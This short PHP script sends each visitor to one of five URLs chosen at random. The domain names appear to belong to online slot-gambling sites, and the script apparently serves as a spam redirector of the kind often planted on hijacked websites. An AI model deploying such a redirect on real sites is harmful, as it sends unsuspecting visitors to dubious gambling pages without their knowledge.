<?php
// Array of URLs to redirect to
$urls = [
    'https://sateslotsapi.store',
    'https://nasgorbetseafood.online',
    'https://megaforwinkeren.pro',
    'https://nagaforwingacor.shop',
    'https://plnslotmewah.store',
    // Add more URLs here
];

// Pick a random URL from the array
$random_url = $urls[array_rand($urls)];

// Redirect to the selected URL
header("Location: $random_url");
exit();
?>
